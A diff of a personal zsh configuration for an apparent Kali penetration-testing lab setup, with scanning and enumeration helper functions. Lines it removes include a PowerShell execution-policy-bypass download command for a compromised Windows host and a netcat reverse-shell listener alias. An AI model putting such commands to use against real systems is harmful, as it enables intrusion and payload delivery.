@@ -1,16 +1,63 @@
-export TERM="xterm-256color"
-
 # If you come from bash you might have to change your $PATH.
-export PATH=$HOME/bin:/usr/local/bin:$PATH
-export PATH=$HOME/.local/bin:$PATH
+# export PATH=$HOME/bin:/usr/local/bin:$PATH
 
 # Path to your oh-my-zsh installation.
-export ZSH=$HOME/.oh-my-zsh
+export TERM="xterm-256color"
 
-# Set name of the theme to load. Optionally, if you set this to "random"
-# it'll load a random theme each time that oh-my-zsh is loaded.
-# See https://github.com/robbyrussell/oh-my-zsh/wiki/Themes
+setopt autocd              # change directory just by typing its name
+#setopt correct            # auto correct mistakes
+setopt interactivecomments # allow comments in interactive mode
+setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
+setopt nonomatch           # hide error message if there is no match for the pattern
+setopt notify              # report the status of background jobs immediately
+setopt numericglobsort     # sort filenames numerically when it makes sense
+setopt promptsubst         # enable command substitution in prompt
 
+WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word
+
+# hide EOL sign ('%')
+PROMPT_EOL_MARK=""
+
+# configure key keybindings
+bindkey -e                                        # emacs key bindings
+bindkey ' ' magic-space                           # do history expansion on space
+bindkey '^U' backward-kill-line                   # ctrl + U
+bindkey '^[[3;5~' kill-word                       # ctrl + Supr
+bindkey '^[[3~' delete-char                       # delete
+bindkey '^[[1;5C' forward-word                    # ctrl + ->
+bindkey '^[[1;5D' backward-word                   # ctrl + <-
+bindkey '^[[5~' beginning-of-buffer-or-history    # page up
+bindkey '^[[6~' end-of-buffer-or-history          # page down
+bindkey '^[[H' beginning-of-line                  # home
+bindkey '^[[F' end-of-line                        # end
+bindkey '^[[Z' undo                               # shift + tab undo last action
+
+# enable completion features
+autoload -Uz compinit
+compinit -d ~/.cache/zcompdump
+zstyle ':completion:*:*:*:*:*' menu select
+zstyle ':completion:*' auto-description 'specify: %d'
+zstyle ':completion:*' completer _expand _complete
+zstyle ':completion:*' format 'Completing %d'
+zstyle ':completion:*' group-name ''
+zstyle ':completion:*' list-colors ''
+zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
+zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
+zstyle ':completion:*' rehash true
+zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
+zstyle ':completion:*' use-compctl false
+zstyle ':completion:*' verbose true
+zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'
+
+# History configurations
+HISTFILE=~/.zsh_history
+HISTSIZE=1000
+SAVEHIST=2000
+setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
+setopt hist_ignore_dups       # ignore duplicated commands history list
+setopt hist_ignore_space      # ignore commands that start with space
+setopt hist_verify            # show command with history expansion to user before running it
+#setopt share_history         # share command history data
 
 POWERLEVEL9K_MODE='nerdfont-complete'
 
@@ -24,7 +71,7 @@ POWERLEVEL9K_MODE="nerdfont-complete"
 #POWERLEVEL9K_DISABLE_RPROMPT=true
 #POWERLEVEL9K_USER_ICON="\uF415" # 
 POWERLEVEL9K_NETWORK_ICON=''
-POWERLEVEL9K_IP_INTERFACE='eth0'
+POWERLEVEL9K_IP_INTERFACE='tun0'
 POWERLEVEL9K_IP_BACKGROUND='blue'
 export DEFAULT_USER="$User"
 POWERLEVEL9K_ALWAYS_SHOW_CONTEXT=true	
@@ -42,20 +89,36 @@ POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(ip os_icon context dir vcs virtualenv)
 POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status time)
 POWERLEVEL9K_DISABLE_CONFIGURATION_WIZARD=true
 
+export ZSH="$HOME/.oh-my-zsh"
 
+# Set name of the theme to load --- if set to "random", it will
+# load a random theme each time oh-my-zsh is loaded, in which case,
+# to know which specific one was loaded, run: echo $RANDOM_THEME
+# See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes
+
+# Set list of themes to pick from when loading at random
+# Setting this variable when ZSH_THEME=random will cause zsh to load
+# a theme from this variable instead of looking in $ZSH/themes/
+# If set to an empty array, this variable will have no effect.
+# ZSH_THEME_RANDOM_CANDIDATES=( "robbyrussell" "agnoster" )
 
 # Uncomment the following line to use case-sensitive completion.
 # CASE_SENSITIVE="true"
 
-# Uncomment the following line to use hyphen-insensitive completion. Case
-# sensitive completion must be off. _ and - will be interchangeable.
+# Uncomment the following line to use hyphen-insensitive completion.
+# Case-sensitive completion must be off. _ and - will be interchangeable.
 # HYPHEN_INSENSITIVE="true"
 
-# Uncomment the following line to disable bi-weekly auto-update checks.
-# DISABLE_AUTO_UPDATE="true"
+# Uncomment one of the following lines to change the auto-update behavior
+# zstyle ':omz:update' mode disabled  # disable automatic updates
+# zstyle ':omz:update' mode auto      # update automatically without asking
+# zstyle ':omz:update' mode reminder  # just remind me to update when it's time
 
 # Uncomment the following line to change how often to auto-update (in days).
-# export UPDATE_ZSH_DAYS=13
+# zstyle ':omz:update' frequency 13
+
+# Uncomment the following line if pasting URLs and other text is messed up.
+# DISABLE_MAGIC_FUNCTIONS="true"
 
 # Uncomment the following line to disable colors in ls.
 # DISABLE_LS_COLORS="true"
@@ -67,6 +130,9 @@ POWERLEVEL9K_DISABLE_CONFIGURATION_WIZARD=true
 # ENABLE_CORRECTION="true"
 
 # Uncomment the following line to display red dots whilst waiting for completion.
+# You can also set it to another string to have that shown instead of the default red dots.
+# e.g. COMPLETION_WAITING_DOTS="%F{yellow}waiting...%f"
+# Caution: this setting can cause issues with multiline prompts in zsh < 5.7.1 (see #5765)
 # COMPLETION_WAITING_DOTS="true"
 
 # Uncomment the following line if you want to disable marking untracked files
@@ -76,90 +142,39 @@ POWERLEVEL9K_DISABLE_CONFIGURATION_WIZARD=true
 
 # Uncomment the following line if you want to change the command execution time
 # stamp shown in the history command output.
-# The optional three formats: "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
+# You can set one of the optional three formats:
+# "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
+# or set a custom format using the strftime function format specifications,
+# see 'man strftime' for details.
 # HIST_STAMPS="mm/dd/yyyy"
 
 # Would you like to use another custom folder than $ZSH/custom?
 # ZSH_CUSTOM=/path/to/new-custom-folder
 
-# Which plugins would you like to load? (plugins can be found in ~/.oh-my-zsh/plugins/*)
-# Custom plugins may be added to ~/.oh-my-zsh/custom/plugins/
+# Which plugins would you like to load?
+# Standard plugins can be found in $ZSH/plugins/
+# Custom plugins may be added to $ZSH_CUSTOM/plugins/
 # Example format: plugins=(rails git textmate ruby lighthouse)
 # Add wisely, as too many plugins slow down shell startup.
 plugins=(
     git
     zsh-autocomplete
+    zsh-syntax-highlighting
     )
-#plugins+=(zsh-nvm)
 
 source $ZSH/oh-my-zsh.sh
 source ~/.oh-my-zsh/plugins/zsh-autocomplete/zsh-autocomplete.plugin.zsh
-# User configuration
-
-# export MANPATH="/usr/local/man:$MANPATH"
-
-# You may need to manually set your language environment
-# export LANG=en_US.UTF-8
-
-# Preferred editor for local and remote sessions
-# if [[ -n $SSH_CONNECTION ]]; then
-#   export EDITOR='vim'
-# else
-#   export EDITOR='mvim'
-# fi
-
-# Compilation flags
-# export ARCHFLAGS="-arch x86_64"
-
-# ssh
-# export SSH_KEY_PATH="~/.ssh/rsa_id"
-
-# Set personal aliases, overriding those provided by oh-my-zsh libs,
-# plugins, and themes. Aliases can be placed here, though oh-my-zsh
-# users are encouraged to define aliases within the ZSH_CUSTOM folder.
-# For a full list of active aliases, run `alias`.
-#
-# Example aliases
-# alias zshconfig="mate ~/.zshrc"
-# alias ohmyzsh="mate ~/.oh-my-zsh"
-
-
 
 export MARKER_KEY_NEXT_PLACEHOLDER="\C-b"   #change maker key binding from Ctr+t to Ctr+b
 
 [[ -s "$HOME/.local/share/marker/marker.sh" ]] && source "$HOME/.local/share/marker/marker.sh"
 
-
-# cheat sheets (github.com/chubin/cheat.sh), find out how to use commands
-# example 'cheat tar'
-# for language specific question supply 2 args first for language, second as the question
-# eample: cheat python3 execute external program
-
-#Zsh functions
-#---------------------------------------------------
-
 pxinstall() {
     python3 -m pipx install git+$1
 }
-nmap_stealth() {
-    echo "Usage: nmap_stealth <output filename> <ip>"
-    nmap -sS -oN $1 $2
-}
-nmap_fast() {
-    echo "Usage: nmap_fast <output filename> <ip>"
-    nmap -Pn -n -vvv --top-ports 200 --open -oN $1 $2
-}
-nmap_full() {
-    echo "Usage: nmap_full <output filename> <ip>"
-    nmap -Pn -n -vvv -oN  $1 $2
-}
-nmap_udp() {
-    echo "Usage: nmap_udp <ports> <output filename> <ip>"
-    nmap -Pn -n -vvv -sU --top-ports 1000 -oN $1 $2
-}
-nmap_port() {
-    echo "Usage: nmap_port <ports> <output filename> <ip>"
-    nmap -Pn -n -vvv -p $1 -oN $2 $3
+gobust() {
+    echo "Usage: gobust <url>"
+    gobuster -e -u $1 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -s 200,204,301,302
 }
 nikto_without_auth() {
     echo "Usage: nikto <output.txt> <url>"
@@ -176,10 +191,6 @@ killproc() {
 httpsrv() {
     echo "Usage: httpsrv <port>"
     python -m SimpleHTTPServer $1
-}
-ferox() {
-    echo "Usage: feroxbuster <url> <extensions ex: js,html,etc...> <output.txt> <wordlist>"
-    feroxbuster -u $1 -x $2 -e -r -vv -o $3 -w $4
 }
 cheat() {
     if [ "$2" ]; then
@@ -211,16 +222,7 @@ ipgeo() {
         curl "http://api.db-ip.com/v2/free/$(myip)"
     fi
 }
-# You need xclip in order to use this apt install xclip
-#Output powershell script to download file on compromised Windows machine
-psdl(){
-tunip=$(ip a s tun0 | awk -F'[/ ]+' '/inet[^6]/{print $3}');
-read -p "File name to upload? " fileName
-#fileName=$1 Or you can just pass the fileName into psdl without prompt
-longstring="powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadFile('http://$tunip/$fileName','C:\\tmp\\$fileName')\"" # Fix C:\\ to your path
-echo "$longstring" | xclip -selection clipboard
-echo "Copied to clipboard"
-}
+
 extract() {
     if [ -f $1 ] ; then
         case $1 in
@@ -244,11 +246,17 @@ extract() {
 #Search nmap nse scripts
 nsearch() {
     #example usage: nsearch smb
-    l /usr/share/nmap/scripts | grep $1
+    ls /usr/share/nmap/scripts | grep $1
 }
 
 #Aliases
 #---------------------------------------------------
+
+#Alias list impacket modules
+alias listimpacket="ls -la /usr/bin | grep impacket  | awk '{print $9}'"
+
+#Alias to create venv environment 
+alias venv="if [ -e ./.venv/bin/activate ]; then source ./.venv/bin/activate; else python3 -m venv .venv && source ./.venv/bin/activate; fi"
 
 #Alias to convert python 2 code to python3
 alias convert="2to3 . -w"
@@ -256,13 +264,8 @@ alias convert="2to3 . -w"
 #Show icons for fonts for oh my zsh prompt
 alias gicon="get_icon_names"
 
-#Aliases Python Shortcuts
-alias p="python $1" # saves typing python every time.
-alias pi="pipenv install $1" # allows you to just type the package
-alias ps="pipenv shell" # start a env with just "ps"
-
 #Alias for Downloads shortcut
-alias dl="cd ~/Downloads"
+alias dldir="cd /home/kali/Downloads"
 
 #Alias to show Zsh aliases
 alias catz="less ~/.zshrc"
@@ -272,6 +275,9 @@ alias catb="less ~/.bashrc"
 
 #Alias to install package with pipx
 alias pinstall="python3 -m pipx install"
+
+#Alias to install package with pipx
+alias plist="python3 -m pipx list"
 
 #alias to search windows scheduled tasks for privilege escalation
 alias winsch='cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM'
@@ -285,11 +291,8 @@ alias killssh="killall ssh"
 #Bash alias to use exa to list directories and files
 alias l="exa -la"
 
-#Bash alias to scripts directory
-alias scriptdir="cd ~/Scripts/"
-
 #Bash alias to tools directory
-alias tooldir="cd ~/Tools/"
+alias tooldir="cd /opt"
 
 #Bash alias to echo and remind to tmux start log
 alias tmuxlogging="echo 'prefix + shift +  p to start logging'"
@@ -305,15 +308,6 @@ alias tmuxreload="tmux source ~/.tmux.conf"
 
 #Bash alias to go back to home directory
 alias home="cd /home/kali/Desktop"
-
-#Bash alias for gnome screenshot
-alias gpic="gnome-screenshot -w"
-
-#Bash aliases to connect to lab machines
-alias rd2016='rdesktop -g 95% -u administrator 172.16.198.5'
-alias rd2010='rdesktop -g 95% -u administrator 192.168.198.10'
-alias studebian='ssh student@192.168.198.44'
-alias rootdebian='ssh root@192.168.198.44'
 
 #alias for searchsploit
 alias ss='searchsploit'
@@ -348,29 +342,11 @@ alias count='find . -type f | wc -l'
 #Alias for show environment variables sorted
 alias showenv='env | sort'
 
-#Alias for git clone
-alias gc='git clone'
-
-#Alias for change and list directory
-alias cdls='cd "$@" && ls'
-
-#Alias for source command
-alias s='source'
-
-#Alias for source bash profile
-alias sb='source ~/.bashrc'
-
-#Alias for source zsh profile
-alias zb='source ~/.zshrc'
-
 #Copy progress bar
 alias cpv='rsync -ah --info=progress2'
 
 #Wget
 alias wget='wget -c '
-
-#Impacket Smb Server
-alias smbsrv='smbserver.py share .'
 
 #Clear screen
 alias c='clear'
@@ -384,30 +360,11 @@ alias l.='ls -d .* --color=auto'
 #Colorize Grep
 alias grep='grep --color=auto'
 
-#History and jobs shortcuts
-alias h='history'
-alias j='jobs -l'
-
-#Ports
-alias ports='netstat -tulanp'
-
 #HTB Start Openvpn
 alias htblab='sudo openvpn ~/Config/Gfuen640.ovpn'
 
 #Config Dir
 alias configdir='cd ~/Config'
-
-#PWK Connect
-#alias pwk='sudo openvpn ~/Config/OS-86533-PWK.ovpn'
-
-#Change into PWK directory
-#alias pwkdir='cd /home/kali/Desktop/PWK/OSCP/lab/'
-
-#Change into PUBLIC directory
-#alias pwkpublic='cd /home/kali/Desktop/PWK/OSCP/lab/PUBLIC/'
-
-#Change into IT Directory
-#alias pwkit='cd /home/kali/Desktop/PWK/OSCP/lab/IT/'
 
 #Change into directory
 alias ..='cd ../'
@@ -419,9 +376,6 @@ alias logs='cd /root/'
 
 #New Tmux
 alias ts='tmux new-session -s'
-
-#Netcat reverse shell
-alias lsn='sudo rlwrap -r -f . nc -lnvp'
 
 #Copy text to clipboard
 alias clip='xclip -sel clip'
@@ -454,8 +408,6 @@ export PASS2="/usr/share/wordlists/dirb/others/best15.txt"
 export PASS3="/usr/share/wordlists/dirb/others/best115.txt"
 export SECLISTS="/usr/share/seclists"
 export WORDDIR="/usr/share/wordlists"
-export TOOLS="~/Tools/"
-export SCRIPT="~/Scripts/"
 export FTP_USER="offsec"
 export FTP_PASS="lab"
 
@@ -509,12 +461,104 @@ bracket="${txtpur}"
 # See bash(1) for more options
 HISTCONTROL=ignoreboth
 
-# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
-HISTSIZE=5000
-HISTFILESIZE=5000
-
 #Set MYIP environment variable
 if test -e "/sys/class/net/tun0" ; then
 	export MYIP=$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+') 
 	alias myip="export MYIP=$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+') ; echo $MYIP"
+fi
+
+# enable auto-suggestions based on the history
+if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
+    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
+    # change suggestion color
+    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
+fi
+
+# enable command-not-found if installed
+if [ -f /etc/zsh_command_not_found ]; then
+    . /etc/zsh_command_not_found
+fi
+
+# enable syntax-highlighting
+if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] ; then
+    . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
+    ZSH_HIGHLIGHT_STYLES[default]=none
+    ZSH_HIGHLIGHT_STYLES[unknown-token]=fg=red,bold
+    ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
+    ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
+    ZSH_HIGHLIGHT_STYLES[global-alias]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
+    ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
+    ZSH_HIGHLIGHT_STYLES[path]=underline
+    ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
+    ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
+    ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[command-substitution]=none
+    ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[process-substitution]=none
+    ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
+    ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
+    ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
+    ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
+    ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta
+    ZSH_HIGHLIGHT_STYLES[assign]=none
+    ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
+    ZSH_HIGHLIGHT_STYLES[named-fd]=none
+    ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
+    ZSH_HIGHLIGHT_STYLES[arg0]=fg=green
+    ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
+    ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
+    ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
+fi
+
+
+
+
+# User configuration
+
+# export MANPATH="/usr/local/man:$MANPATH"
+
+# You may need to manually set your language environment
+# export LANG=en_US.UTF-8
+
+# Preferred editor for local and remote sessions
+# if [[ -n $SSH_CONNECTION ]]; then
+#   export EDITOR='vim'
+# else
+#   export EDITOR='mvim'
+# fi
+
+# Compilation flags
+# export ARCHFLAGS="-arch x86_64"
+
+# Set personal aliases, overriding those provided by oh-my-zsh libs,
+# plugins, and themes. Aliases can be placed here, though oh-my-zsh
+# users are encouraged to define aliases within the ZSH_CUSTOM folder.
+# For a full list of active aliases, run `alias`.
+#
+# Example aliases
+# alias zshconfig="mate ~/.zshrc"
+# alias ohmyzsh="mate ~/.oh-my-zsh"
+
+# Created by `pipx` on 2023-01-15 23:26:53
+export PATH="$PATH:/root/.local/bin"
+export PYENV_ROOT="$HOME/.pyenv"
+export PATH="$PYENV_ROOT/bin:$PATH"
+if command -v pyenv 1>/dev/null 2>&1; then
+  eval "$(pyenv init --path)"
 fi
